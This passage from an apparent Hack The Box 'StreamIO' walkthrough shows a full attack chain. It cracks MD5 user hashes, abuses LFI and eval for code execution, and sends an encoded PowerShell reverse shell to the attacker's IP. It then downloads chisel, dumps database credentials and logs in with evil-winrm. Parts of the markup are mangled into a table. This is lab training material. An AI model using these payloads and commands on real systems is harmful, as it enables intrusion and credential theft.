font-style: inherit;">Lenord:ee0b8a0937abd60c2882eacb2f8dc49f</span></span>
<span id="cb11-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Lucifer:7df45a9e3de3863807c026ba48e55fb3</span></span>
<span id="cb11-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mat:43b0494e505be040c691856c67385ec6</span></span>
<span id="cb11-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mat:4a258d930b7d3409982d727ddbb4ba88</span></span>
<span id="cb11-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mattt:7b8a3544637ef0e8fd2859095876e461</span></span>
<span id="cb11-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mca:43b0494e505be040c691856c67385ec6</span></span>
<span id="cb11-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mca:7b8a3544637ef0e8fd2859095876e461</span></span>
<span id="cb11-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Michelle:b83439b16f844bd6ffe35c02fe21b3c0</span></span>
<span id="cb11-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">oliver:25ed1bcb423b0b7200f485fc5ff71c8e</span></span>
<span id="cb11-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Oliver:fd78db29173a5cf701bd69027cb9bf6b</span></span>
<span id="cb11-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Robert:f03b910e2bd0313a23fdd7575f34a694</span></span>
<span id="cb11-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Robin:dc332fb5576e9631c9dae83f194f8e70</span></span>
<span id="cb11-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5</span></span>
<span id="cb11-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Samantha:083ffae904143c4796e464dac33c1f7d</span></span>
<span id="cb11-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Stan:384463526d288edcc95fc3701e523bc7</span></span>
<span id="cb11-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Thane:3577c47eb1e12c8ba021611e1280753c</span></span>
<span id="cb11-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Theodore:925e5408ecb67aea449373d668b7359e</span></span>
<span id="cb11-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Victor:bf55e15b119860a6e6b5a164377da719</span></span>
<span id="cb11-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Victoria:b22abb47a02b52d5dfa27fb0b534f693</span></span>
<span id="cb11-38"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">William:d62be0dc82071bccc1322d64ec5b6c51</span></span>
<span id="cb11-39"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332</span></span></code></pre></div>
<p>Crack the hashes with hashcat</p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio hashcat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-a0</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m0</span> hashes.txt /usr/share/wordlists/rockyou.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--user</span></span>
<span id="cb12-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio hashcat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-a0</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m0</span> hashes.txt /usr/share/wordlists/rockyou.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--user</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--show</span></span>
<span id="cb12-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd</span></span>
<span id="cb12-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">asdasd:7815696ecbf1c96e6894b779456d330e:asd</span></span>
<span id="cb12-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Barry:54c88b2dbd7b1a84012fabc1a4c73415:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$hadoW</span></span>
<span id="cb12-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$monique$1</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">991$</span></span>
<span id="cb12-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Clara:ef8f3d30a856cf166fb8215aca93e9ff:%</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$clara</span></span>
<span id="cb12-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">d41d8cd98f00b204e9800998ecf8427e:</span></span>
<span id="cb12-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Juliette:6dcd87740abb64edfa36d170f0d5450d:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$3</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">xybitch</span></span>
<span id="cb12-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##</span></span>
<span id="cb12-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i</span></span>
<span id="cb12-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mat:4a258d930b7d3409982d727ddbb4ba88:mat</span></span>
<span id="cb12-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123</span></span>
<span id="cb12-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">oliver:25ed1bcb423b0b7200f485fc5ff71c8e:zz</span></span>
<span id="cb12-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$</span></span>
<span id="cb12-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical</span></span>
<span id="cb12-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!</span></span>
<span id="cb12-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..</span></span></code></pre></div>
<table class="caption-top table">
<thead>
<tr class="header">
<th style="text-align: left;">### Step 3 Testing all the credentials on <code>https://streamio.htb/login.php</code> we find that only <code>yoshihide:66boysandgirls..</code> works. As <code>yoshihide</code> we are able to visit <code>https://streamio.htb/admin</code> and can manage users, staff, movies and “leave a message for admin”.</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">### Step 4 Tinkering around with the LFI I came to think of <code>php://filter</code>, we should be able to extract the code of the known files to see if there are any vulnerable functions that we can exploit.</td>
</tr>
<tr class="even">
<td style="text-align: left;">```bash ➜ streamio curl -k –cookie “PHPSESSID=ciku9juef85i9sj1eju4alj375” https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php [… snip …] PGgxPk1..</td>
</tr>
<tr class="odd">
<td style="text-align: left;">➜ streamio echo “PGgxPk1..” | base64 -d [… snip …]</td>
</tr>
<tr class="even">
<td style="text-align: left;"></td>
</tr>
<tr class="odd">
<td style="text-align: left;"></td>
</tr>
<tr class="even">
<td style="text-align: left;"></td>
</tr>
<tr class="odd">
<td style="text-align: left;">At the end we find a vulnerable function:</td>
</tr>
<tr class="even">
<td style="text-align: left;">With the eval-function we are able to execute php scripts and system commands. First confirm that we got RCE and then leverage to gain a reverse shell! ```bash ➜ streamio echo “c3lzdGVtKCRfR0VUWydjbWQnXSk7” | base64 -d system($_GET[‘cmd’]);%</td>
</tr>
<tr class="odd">
<td style="text-align: left;">➜ streamio curl -k –cookie “PHPSESSID=ciku9juef85i9sj1eju4alj375” –data-binary “include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7” https://streamio.htb/admin/?debug=master.php&amp;cmd=dir [… snip …]</td>
</tr>
<tr class="even">
<td style="text-align: left;"></td>
</tr>
<tr class="odd">
<td style="text-align: left;">Directory of C:.htb</td>
</tr>
<tr class="even">
<td style="text-align: left;">02/22/2022 03:49 AM</td>
</tr>
<tr class="odd">
<td style="text-align: left;">For the reverse shell I find it to be easiest to use <a href="https://revshells.com">revshells.com</a> and select <code>PowerShell #3 (Base64)</code> and from the advanced options enable URL Encoding. This will most of the times get rid of all syntax/encoding issues. ```bash ➜ streamio curl -k –cookie “PHPSESSID=tale6gpt5rke8jbtvc6rqlhqng” –data-binary “include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7” https://streamio.htb/admin/?debug=master.php&amp;cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAiACwANAA0ADgAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D</td>
</tr>
<tr class="even">
<td style="text-align: left;">➜ streamio rlwrap nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.3] from (UNKNOWN) [10.10.11.158] 51338</td>
</tr>
<tr class="odd">
<td style="text-align: left;">PS C:.htb&gt; whoami streamio```</td>
</tr>
<tr class="even">
<td style="text-align: left;">### Step 5 Inside the box we start to enumerate local files, and quickly we find some database credentials.</td>
</tr>
<tr class="odd">
<td style="text-align: left;">```bash PS C:.htb&gt; cat index.php [… snip …] <img src="https://latex.codecogs.com/png.latex?connection%20=%20array(%22Database%22=%3E%22STREAMIO%22,%20%22UID%22%20=%3E%20%22db_admin%22,%20%22PWD%22%20=%3E%20'B1@hx31234567890');">handle = sqlsrv_connect(‘(local)’,$connection);</td>
</tr>
<tr class="even">
<td style="text-align: left;">```</td>
</tr>
<tr class="odd">
<td style="text-align: left;">Using netstat we find that the database is running on default port <strong>1433</strong>: ```powershell PS C:.htb&gt; netstat -aof [… snip …] TCP 0.0.0.0:1433 DC.streamIO.htb:0 LISTENING 3616</td>
</tr>
<tr class="even">
<td style="text-align: left;">PS C:.htb&gt; Get-Process -Id 3616 Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName</td>
</tr>
</tbody>
</table>
<pre><code>856      57   442572     317908              3616   0 sqlservr</code></pre>
<pre><code>
To be able to communicate with the service we need to setup a tunnel, we do this using chisel.
```bash
## Setup local listener
➜  chisel_1.7.7 ./chisel_1.7.7_linux_amd64 server --reverse --port 9001

## Upload chisel to victim (note: SMB transfer will get caught)
PS C:\Windows\Tasks&gt; curl http://10.10.14.3:8080/chisel.exe -o chisel.exe

## Run the client to tunnel port 1433
PS C:\Windows\Tasks&gt; .\chisel.exe client 10.10.14.3:9001 R:1433:localhost:1433</code></pre>
<p>Enumerate the database using <code>sqsh</code>:</p>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode sql code-with-copy"><code class="sourceCode sql"><span id="cb15-1">➜ streamio sqsh <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>S <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">127</span>.<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>.<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.1</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>U db_admin <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>P <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'B1@hx31234567890'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>D streamio_backup</span>
<span id="cb15-2"><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">select</span> @@version</span>
<span id="cb15-3"><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> go</span>
<span id="cb15-4">    Microsoft SQL Server <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2019</span> (RTM) <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">15</span>.<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>.<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">2000.5</span> (X64) </span>
<span id="cb15-5">    Sep <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">24</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2019</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">13</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">:48:23</span> </span>
<span id="cb15-6">    Copyright (C) <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2019</span> Microsoft Corporation</span>
<span id="cb15-7">    Express Edition (<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">64</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>bit) <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">on</span> Windows Server <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2019</span> Standard <span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.0</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>X64<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> (<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">Build</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">17763</span>: ) (Hypervisor)</span>
<span id="cb15-8"></span>
<span id="cb15-9"><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">select</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">from</span> users;</span>
<span id="cb15-10"><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> go</span>
<span id="cb15-11"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">id</span>     username       <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">password</span>                                                                                                                                             </span>
<span id="cb15-12"> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span>      nikk37         <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">389</span>d14cb8e4e9b94b137deb1caf0612a</span>
<span id="cb15-13"> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span>      yoshihide      b779ba15cedfd22a023c4d8bcf5f2332</span>
<span id="cb15-14"> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">3</span>      James          c660060492d9edcaa8332d89c99c9239</span>
<span id="cb15-15"> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4</span>      Theodore       <span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">925e5408</span>ecb67aea449373d668b7359e</span>
<span id="cb15-16"> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">5</span>      Samantha       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">083</span>ffae904143c4796e464dac33c1f7d</span>
<span id="cb15-17"> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">6</span>      Lauren         <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">08344</span>b85b329d7efd611b7a7743e8a09</span>
<span id="cb15-18"> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">7</span>      William        d62be0dc82071bccc1322d64ec5b6c51</span>
<span id="cb15-19"> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">8</span>      Sabrina        f87d3c0d6c8fd686aacc6627f1f493a5</span></code></pre></div>
<p>Save the users and it’s hash to a file and start to crack them with hashcat.</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio hashcat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-a0</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m0</span> db-users.txt /usr/share/wordlists/rockyou.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--user</span></span>
<span id="cb16-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio hashcat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-a0</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m0</span> db-users.txt /usr/share/wordlists/rockyou.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--user</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--show</span></span>
<span id="cb16-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com</span></span>
<span id="cb16-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..</span></span>
<span id="cb16-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##</span></span>
<span id="cb16-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$</span></span></code></pre></div>
<p>We find one new set of credentials - <code>nikk37:get_dem_girls2@yahoo.com</code>. Login with Evil-WinRM and grab that user flag!</p>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio evil-winrm <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> 10.10.11.158 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> nikk37 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> get_dem_girls2@yahoo.com</span>
<span id="cb17-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*Evil-WinRM*</span> PS C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\n</span>ikk37<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>esktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> cat user.txt</span>
<span id="cb17-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3e11807b2fae875626ee550f08bd5336</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>Look on groups, privileges and powershell history.</p>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb18-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## History (none)</span></span>
<span id="cb18-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\nikk37\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Get-ChildItem</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Force</span>
<span id="cb18-3"></span>
<span id="cb18-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Groups and Privileges</span></span>
<span id="cb18-5"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> whoami <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>all</span>
<span id="cb18-6"></span>
<span id="cb18-7">USER INFORMATION</span>
<span id="cb18-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----------------</span></span>
<span id="cb18-9"></span>
<span id="cb18-10">User Name       SID</span>
<span id="cb18-11"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">===============</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==============================================</span></span>
<span id="cb18-12">streamio\nikk37 S-1-5-21-1470860369-1569627196-4264678630-1106</span>
<span id="cb18-13"></span>
<span id="cb18-14"></span>
<span id="cb18-15"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">GROUP</span> INFORMATION</span>
<span id="cb18-16"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-----------------</span></span>
<span id="cb18-17"></span>
<span id="cb18-18"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Group</span> Name                                  <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Type</span>             SID          Attributes</span>
<span id="cb18-19"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">===========================================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">============</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==================================================</span></span>
<span id="cb18-20">Everyone                                    Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-1-0      Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb18-21">BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb18-22">BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb18-23">BUILTIN\Pre-Windows <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2000</span> Compatible Access  Alias            S-1-5-32-554 Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb18-24">NT AUTHORITY\NETWORK                        Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-2      Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb18-25">NT AUTHORITY\Authenticated Users            Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-11     Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb18-26">NT AUTHORITY\This Organization              Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-15     Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb18-27">NT AUTHORITY\NTLM Authentication            Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-64-10  Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb18-28">Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</span>
<span id="cb18-29"></span>
<span id="cb18-30"></span>
<span id="cb18-31">PRIVILEGES INFORMATION</span>
<span id="cb18-32"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----------------------</span></span>
<span id="cb18-33"></span>
<span id="cb18-34">Privilege Name                Description                    State</span>
<span id="cb18-35"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=============================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==============================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=======</span></span>
<span id="cb18-36">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span>
